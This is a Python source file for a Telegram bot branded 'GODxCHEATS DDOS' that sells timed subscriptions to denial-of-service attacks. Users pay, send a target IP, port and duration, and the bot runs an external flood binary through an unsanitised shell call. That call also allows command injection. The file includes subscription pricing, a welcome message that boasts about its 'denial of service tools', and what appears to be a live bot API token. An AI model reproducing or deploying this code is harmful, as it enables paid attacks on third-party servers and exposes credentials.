import telebot
import subprocess
import datetime
import os
import time
import hashlib
import requests
from io import BytesIO
from PIL import Image
from keep_alive import keep_alive
from telebot import types
import threading  # <-- Add this line

# Handler for the attack button press
# Start the keep_alive function to keep the bot running
keep_alive()

# Bot and Admin Setup
API_TOKEN = '7774669814:AAGY2ohbBXKh_8WmT0AJDI_pev4vCtWAJfE'
ADMIN_ID = ["1662672529"]
USER_FILE = "users.txt"
ADMIN_FILE = "admins.txt"
LOG_FILE = "log.txt"
FREE_USER_FILE = "free_users.txt"

# Global dictionaries to manage cooldowns and expiry times
bgmi_cooldown = {}
user_approval_expiry = {}

# Initialize the bot
bot = telebot.TeleBot(API_TOKEN)

# Define the custom keyboard with buttons
keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
keyboard.row(
    telebot.types.KeyboardButton("ATTACK"),
    telebot.types.KeyboardButton("PAY"),
    telebot.types.KeyboardButton("PLAN")
)
keyboard.add(telebot.types.KeyboardButton("HELP"))

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Get the user's first name from the message object
    user_first_name = message.from_user.first_name
    
    welcome_text = f'''🔥 𝗛𝗘𝗟𝗟𝗢 {user_first_name.upper()}! 🔥
    
    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GODxCHEATS DDOS**! 💥
    
    💻 **𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗱𝗲𝗻𝗶𝗮𝗹 𝗼𝗳 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝘁𝗼𝗼𝗹𝘀** 𝗮𝗿𝗲 𝗷𝘂𝘀𝘁 𝗮 𝗰𝗹𝗶𝗰𝗸 𝗮𝘄𝗮𝘆! 💣
    
    
    ⚠️ **𝗡𝗢𝗧𝗘**: 𝗧𝗵𝗲 𝗯𝗼𝘁 𝗶𝘀 𝗼𝗻𝗹𝗲𝘆 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 **𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦**! 🛑

    💥 **𝗘𝗻𝗷𝗼𝘆 𝘁𝗵𝗲 𝗽𝗼𝗿𝘁𝗮𝗹 𝗼𝗳 𝗽𝗼𝗪𝗘𝗥!** ⚡'''
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

# Button handling for "ATTACK"


# Additional command for Help
@bot.message_handler(func=lambda message: message.text == 'HELP')
def help_button(message):
    help_text = '''
    Available Commands:

      🍀   /admin <user_id> - Add a new admin
         Usage: /admin <user_id>
         Example: /admin 12345

     😈    /removeadmin <user_id> - Remove a user from the admin list
         Usage: /removeadmin <user_id>
         Example: /removeadmin 12345

     💯    /add <user_id> <duration> - Add a user with an expiry time (e.g., /add <user_id> 1day)
         Usage: /add <user_id> <duration>
         Example: /add 12345 1day

       😂  /remove <user_id> - Remove a user from the allowed list
         Usage: /remove <user_id>
         Example: /remove 12345

        🎈 /setcooldown <time_in_seconds> - Set cooldown for a user (only for admins)
         Usage: /setcooldown <time_in_seconds>
         Example: /setcooldown 60

       👻  /pay - Show payment-related information
         Usage: /pay
         Example: /pay

       😎  /plan - Show the available subscription plans
         Usage: /plan
         Example: /plan

        ♥️ /message <message> - Broadcast a message to all users (admins only)
         Usage: /message <message>
         Example: /message "Important update!"

       💦  ATTACK - Start an attack with the provided parameters (IP, port, duration)
         Usage: ATTACK
         Example: ATTACK 192.168.0.1 80 30

        ❤️‍🩹 /alluser - Check the list of all users
         Usage: /alluser
         Example: /alluser
         
        👌/adminlist -check to all approved admin list
        usage:- /adminlist
        example /adminlist
        
    '''
    bot.reply_to(message, help_text)

# Global dictionary to store screenshot submission status
user_screenshot_status = {}
user_screenshot_hash = {}

REFERENCE_IMAGE_URL = 'http://example.com/path/to/your/image.jpg'
# Function to get the hash of an image
def get_image_hash(image_url):
    try:
        # Download the image
        response = requests.get(image_url)
        img = Image.open(BytesIO(response.content))
        
        # Convert the image to a format suitable for hashing (e.g., grayscale)
        img = img.convert('RGB')
        
        # Create a hash of the image (e.g., using MD5)
        img_hash = hashlib.md5(img.tobytes()).hexdigest()
        return img_hash
    except Exception as e:
        print(f"Error fetching or processing image: {e}")
        return None

# Store the hash of the reference image when the bot starts
REFERENCE_IMAGE_HASH = get_image_hash(REFERENCE_IMAGE_URL)


# Load allowed admin IDs from the file
def read_admins():
    return read_file(ADMIN_FILE)

# Helper function to read a file into a list
def read_file(file_path):
    try:
        with open(file_path, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Load allowed user IDs from the file
allowed_user_ids = read_file(USER_FILE)

# ------------------ Logging Functions ------------------

def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    except Exception as e:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# ------------------ Approval and Expiry Management ------------------

def set_approval_expiry_date(user_id, duration, time_unit):
    # Handle invalid time_unit gracefully by setting a default expiry date of now if invalid
    time_units = {
        'hour': datetime.timedelta(hours=duration),
        'day': datetime.timedelta(days=duration),
        'week': datetime.timedelta(weeks=duration),
        'month': datetime.timedelta(days=30*duration)  # Approximation of 1 month = 30 days
    }

    # Get the timedelta for the given time_unit, default to timedelta(0) if invalid
    expiry_date = datetime.datetime.now() + time_units.get(time_unit, datetime.timedelta())
    
    # Assuming `user_approval_expiry` is a global dictionary
    user_approval_expiry[user_id] = expiry_date
    return expiry_date

# ------------------ Attack and Response Functions ------------------

attack_in_progress = False
# Define the function to start the attack
def start_attack_reply(message, target, port, duration):
    username = message.from_user.username or message.from_user.first_name
    
    # Initial message informing the user the attack has started
    response = f" 🅰🆃🆃🅰🅲🅺 🅻🅰🆄🅽🅲🅷🅴🅳\n\n🆃🅰🆁🅶🅴🆃: {target}\n🅿🅾🆁🆃: {port}\n🅳🆄🆁🅰🆃🅾🅸🅽: {duration} Seconds"
    attack_message = bot.reply_to(message, response)

    # Function to run the countdown
    def countdown():
        nonlocal duration
        time.sleep(duration)  # Wait for the specified duration

        # After the countdown finishes, send a final message
        # Continue the countdown logic
        bot.edit_message_text(f"{response}\n\n **BGMI KI CHUDAYI KHATAM**.\n😂😂😂😂", attack_message.chat.id, attack_message.message_id)

    # Start the countdown in a separate thread
    threading.Thread(target=countdown).start()

    # Start the actual attack using subprocess
    subprocess.run(f"./ok {target} {port} {duration} 1200", shell=True)

# ------------------ Command Handlers ------------------
@bot.message_handler(commands=['admin'])
def add_admin(message):
    user_id = str(message.chat.id)
    
    # Check if the sender is an existing admin
    if user_id in ADMIN_ID:
        command = message.text.split()
        
        if len(command) == 2:
            new_admin_id = command[1]
            
            if new_admin_id not in ADMIN_ID:
                ADMIN_ID.append(new_admin_id)  # Add new admin ID to the list of admins
                with open("admins.txt", "a") as file:
                    file.write(f"{new_admin_id}\n")  # Save the new admin ID to the file
                response = f"✅ {new_admin_id} has been successfully added as an admin."
            else:
                response = f"❌ {new_admin_id} is already an admin."
        else:
            response = "❌ Invalid format. Use: /admin <user_id>"
    else:
        response = "❌ You are not authorized to use this command."
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    
    # Check if the sender is an existing admin
    if user_id in ADMIN_ID:
        command = message.text.split()
        
        if len(command) == 2:
            admin_to_remove_id = command[1]
            
            if admin_to_remove_id in ADMIN_ID:
                ADMIN_ID.remove(admin_to_remove_id)  # Remove admin ID from the list of admins
                with open("admins.txt", "w") as file:
                    for admin in ADMIN_ID:
                        file.write(f"{admin}\n")  # Save the updated admin list to the file
                response = f"✅ {admin_to_remove_id} has been successfully removed as an admin."
            else:
                response = f"❌ {admin_to_remove_id} is not an admin."
        else:
            response = "❌ Invalid format. Use: /removeadmin <user_id>"
    else:
        response = "❌ You are not authorized to use this command."
    
    bot.reply_to(message, response)   

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        command = message.text.split()
        if len(command) > 2:
            user_to_add, duration_str = command[1], command[2]
            try:
                duration, time_unit = int(duration_str[:-4]), duration_str[-4:].lower()
                if duration <= 0 or time_unit not in ['hour', 'day', 'week', 'month']:
                    raise ValueError
            except ValueError:
                response = "𝚒𝚗𝚟𝚊𝚕𝚒𝚍 𝚏𝚘𝚛𝚖𝚊𝚝𝚎 𝚞𝚜𝚎 𝚝𝚘. 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return
            
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                expiry_date = set_approval_expiry_date(user_to_add, duration, time_unit)
                response = f" 🍀𝚞𝚜𝚎𝚛 {user_to_add} 𝚊𝚍𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕. 𝚊𝚌𝚌𝚎𝚜𝚜 𝚎𝚡𝚙𝚒𝚛𝚎 𝚘𝚗  {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                response = "𝚞𝚜𝚎𝚛 𝚊𝚕𝚛𝚎𝚍𝚢 𝚎𝚡𝚒𝚜𝚝"
        else:
            response = "𝙴𝚡𝚊𝚖𝚙𝚕𝚎 𝚞𝚜𝚎: /add <𝚞𝚜𝚎𝚛 𝚒𝚍> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗>"
    else:
        response = "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @𝙶𝚘𝚍𝚡𝙰𝚕𝚘𝚗𝚎𝙱𝚘𝚢."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)  # Get the user ID of the person sending the message
    command = message.text.split()  # Split the command to get the user ID to remove

    if len(command) > 1:  # Check if a user ID is provided
        user_to_remove = command[1]  # Get the user ID to remove
        
        if user_id in ADMIN_ID:  # Check if the person sending the message is an admin
            if user_to_remove in allowed_user_ids:  # Check if the user is in the allowed list
                allowed_user_ids.remove(user_to_remove)  # Remove the user from allowed list
                
                # Remove from the ADMIN_ID list if they are an admin
                if user_to_remove in ADMIN_ID:
                    ADMIN_ID.remove(user_to_remove)  # Remove the user from admin list

                # Save the updated allowed users and admin list back to the files
                try:
                    with open(USER_FILE, "w") as file:
                        for user in allowed_user_ids:
                            file.write(f"{user}\n")
                    
                    with open(ADMIN_FILE, "w") as file:
                        for admin in ADMIN_ID:
                            file.write(f"{admin}\n")

                    response = f"𝚞𝚜𝚎𝚛 {user_to_remove} 𝚛𝚎𝚖𝚘𝚟𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢."
                except Exception as e:
                    response = f"❌ 𝑬𝑹𝑹𝑶𝑹: Could not save the updated list. {str(e)}"
            else:
                response = f"𝚞𝚜𝚎𝚛 {user_to_remove} 𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍 𝚒𝚗 𝚊𝚕𝚕𝚘𝚠𝚎𝚍 𝚞𝚜𝚎𝚛𝚜."
        else:
            response = "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗."
    else:
        response = "𝙴𝚡𝚊𝚖𝚙𝚕𝚎 𝚝𝚘 𝚞𝚜𝚎: /remove <𝚞𝚜𝚎𝚛 𝚒𝚍>"
    
    bot.reply_to(message, response)


# Reference image URL (you can update it to your specific image URL)

@bot.message_handler(func=lambda message: message.text == 'ATTACK')
def attack_button(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        # Step 1: Ask for target IP, port, and duration in one input
        msg = bot.reply_to(message, "Please provide the target IP address, port, and duration in the following format:\n`<IP> <Port> <Duration>`\nExample: `13.626.62 16388 120`")
        bot.register_next_step_handler(msg, process_input, user_id)
    else:
        bot.reply_to(message, "❌ You are not authorized to use the ATTACK command.")

# Step 2: Process the input (IP, port, duration) and immediately launch the attack
def process_input(message, user_id):
    user_input = message.text.strip()
    
    # Split the input into three parts
    parts = user_input.split()
    
    if len(parts) != 3:
        bot.reply_to(message, "❌ Invalid input format. Please provide the input in the following format:\n`<IP> <Port> <Duration>`\nExample: `13.626.62 16388 120`")
        return
    
    target_ip, port_str, duration_str = parts

    # Convert port and duration to integers
    try:
        port = int(port_str)
        duration = int(duration_str)
    except ValueError:
        bot.reply_to(message, "❌ Invalid port or duration. Please provide valid integers.")
        return
    
    # Log the attack details immediately before starting
    record_command_logs(user_id, '/venompapa', target_ip, port, duration)
    log_command(user_id, target_ip, port, duration)
    start_attack_reply(message, target_ip, port, duration)
    
    # Run the attack immediately (no validation checks for IP or port)
    subprocess.run(f"./ok {target_ip} {port} {duration} 1200", shell=True)
    
    # Respond with completion message
    bot.reply_to(message, f"ATTACK FINISHED. Target: {target_ip}, Port: {port}, Duration: {duration}s")

    # Optionally, set a cooldown after the attack
    attack_cooldown[user_id] = datetime.datetime.now() + datetime.timedelta(seconds=60)  # 1-minute cooldown

        
@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    user_id = str(message.chat.id)
    
    if user_id in ADMIN_ID:
        command = message.text.split()
        
        if len(command) == 2:
            try:
                cooldown_time = int(command[1])  # Get cooldown time in seconds
                
                if cooldown_time < 0:
                    response = "❌ 𝙲𝚘𝚘𝚕𝚍𝚘𝚠𝚗 𝚝𝚒𝚖𝚎 𝚌𝚊𝚗'𝚝 𝚋𝚎 𝚗𝚎𝚐𝚊𝚝𝚒𝚟𝚎."
                else:
                    # Set the cooldown time for the user
                    bgmi_cooldown[user_id] = datetime.datetime.now() + datetime.timedelta(seconds=cooldown_time)
                    response = f"✅ 𝚌𝚘𝚘𝚕𝚍𝚘𝚠𝚗 𝚏𝚘𝚛 𝚞𝚜𝚎𝚛 {user_id} 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚜𝚎𝚝 𝚏𝚘𝚛 {cooldown_time} 𝚜𝚎𝚌𝚘𝚗𝚍𝚜."
            except ValueError:
                response = "❌ 𝚒𝚗𝚟𝚊𝚕𝚒𝚍 𝚝𝚒𝚖𝚎 𝚏𝚘𝚛𝚖𝚊𝚝. 𝙿𝚕𝚎𝚊𝚜𝚎 𝚜𝚙𝚎𝚌𝚒𝚏𝚢 𝚝𝚒𝚖𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜."
        else:
            response = "❌ 𝚂𝚎𝚝 𝚝𝚒𝚖𝚎 𝚏𝚘𝚛𝚖𝚊𝚝: /setcooldown <𝚝𝚒𝚖𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜>"
    else:
        response = "❌ 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚝𝚘 𝚐𝚒𝚟𝚎 𝚝𝚑𝚒𝚜 𝚌𝚘𝚖𝚖𝚊𝚗𝚍."
    
    bot.reply_to(message, response)        
        

# Command for /pay to send an image back to the user
@bot.message_handler(func=lambda message: message.text == 'PAY')
def pay_button(message):
    image_url = "https://files.catbox.moe/q2uuyh.jpg"  # Replace with a valid image URL (direct image link)
    try:
        bot.send_photo(message.chat.id, image_url)
    except Exception as e:
        bot.reply_to(message, "❌ Error: Could not send the image. Please try again later.")
        print(f"Error sending image: {e}")

# Replace 'admin_chat_id' with the actual chat ID of the admin
admin_chat_id = '1662672529'

@bot.message_handler(content_types=['photo'])
def forward_photo(message):
    try:
        # Get the file_id of the photo sent by the user
        file_id = message.photo[-1].file_id
        
        # Forward the photo to the admin
        bot.forward_message(admin_chat_id, message.chat.id, message.message_id)
        
        # Optionally, you can send a confirmation to the user
        bot.reply_to(message, "✅ Your screenshot has been forwarded to the admin.")
        
    except Exception as e:
        bot.reply_to(message, "❌ Error: Could not forward the photo. Please try again later.")
        print(f"Error forwarding photo: {e}")
            
@bot.message_handler(func=lambda message: message.text == 'PLAN')
def plan_button(message):
    plan_text = '''
    ╔╦╦╦═╦╗╔═╦═╦══╦═╗
    ║║║║╩╣╚╣═╣║║║║║╩╣
    ╚══╩═╩═╩═╩═╩╩╩╩═╝

    𝗔𝗗𝗠𝗜𝗡 -- ( @GODXALONEBOY ) 👑

    🚀 **Available Plans**:
    
    🚀 **𝟭𝐃𝐚𝐲 Plan** 💠 ₹100 ✅
    - Perfect for a quick trial period.
    - Duration: 1 Day
    
    🚀 **𝟯𝐃𝐚𝐲 Plan** 💠 ₹250 ✅
    - Great for short-term usage.
    - Duration: 3 Days
    
    🚀 **𝟳𝐃𝐚𝐲 Plan** 💠 ₹400 ✅
    - Ideal for extended access.
    - Duration: 7 Days
    
    🚀 **𝟯𝟬𝐃𝐚𝐲 Plan** 💠 ₹600 ✅
    - Best value for long-term usage.
    - Duration: 30 Days

    🔥 **Premium Features Included**:
    - Access to **exclusive bot features** and **priority support**.
    - Instant access to **paid files** and **special tools**.

    🖥️ **Hosting Services**:
    - **Private hosting** for your custom bots and projects.
    - Affordable hosting plans available for bots with **24/7 uptime**.
    - Price: Starting at ₹500/month.

    🔒 **Paid Files**:
    - **Exclusive paid files** (e.g., scripts, bot templates, custom tools) available for purchase.
    - Files are regularly updated to keep up with the latest trends and features.
    - Prices for paid files: ₹100 – ₹500 depending on the file.

    📱 **Supported Platforms**:
    - Fully supported on **Android** 📱 and **iPhone** 📲.

    🌐 **Contact us for more details or to get started**.
    '''
    bot.reply_to(message, plan_text)
    

@bot.message_handler(commands=['message'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    
    # Check if the user is an admin
    if user_id in ADMIN_ID:
        # Split the message to get the broadcast content
        command = message.text.split(maxsplit=1)
        
        if len(command) > 1:
            broadcast_content = command[1]
            
            # Load the allowed users from the file
            allowed_user_ids = read_file(USER_FILE)
            
            # Send the broadcast message to all users
            for user in allowed_user_ids:
                try:
                    bot.send_message(user, broadcast_content)
                except Exception as e:
                    print(f"Error sending message to {user}: {e}")
            
            response = "✅ Broadcast message sent successfully."
        else:
            response = "❌ No message provided. Please specify the content you want to broadcast."
    else:
        response = "❌ You are not authorized to use this command."
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['alluser'])
def all_user_list(message):
    user_id = str(message.chat.id)
    
    # Check if the user is an admin
    if user_id in ADMIN_ID:
        # Load the allowed users from the file
        allowed_user_ids = read_file(USER_FILE)
        
        if allowed_user_ids:
            # Prepare the list of users with their usernames and IDs
            user_list = []
            for user_id in allowed_user_ids:
                try:
                    user_info = bot.get_chat(user_id)  # Get user info using chat ID
                    username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
                    user_list.append(f"{username} (ID: {user_id})")
                except Exception as e:
                    user_list.append(f"UserID: {user_id} (Username not available)")
            
            # Format the list of users
            response = "✅ List of all approved users:\n\n" + "\n".join(user_list)
        else:
            response = "❌ No approved users found."
    else:
        response = "❌ You are not authorized to use this command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['adminlist'])
def admin_list(message):
    user_id = str(message.chat.id)
    
    # Check if the sender is an existing admin
    if user_id in ADMIN_ID:
        # Get the list of admins from the admins.txt file
        admins = read_file(ADMIN_FILE)
        
        if admins:
            # Create a formatted string of admin list with usernames and IDs
            admin_list_text = "🛡️ **Admin List**:\n\n"
            for admin_id in admins:
                try:
                    admin_info = bot.get_chat(admin_id)  # Get admin info using chat ID
                    username = f"@{admin_info.username}" if admin_info.username else f"UserID: {admin_id}"
                    admin_list_text += f"👑 {username} (ID: {admin_id})\n"
                except Exception as e:
                    admin_list_text += f"👑 UserID: {admin_id} (Username not available)\n"
            
            bot.reply_to(message, admin_list_text)
        else:
            bot.reply_to(message, "❌ There are no admins in the list.")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.")

        
# ------------------ Main Bot Loop ------------------

# Start polling the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
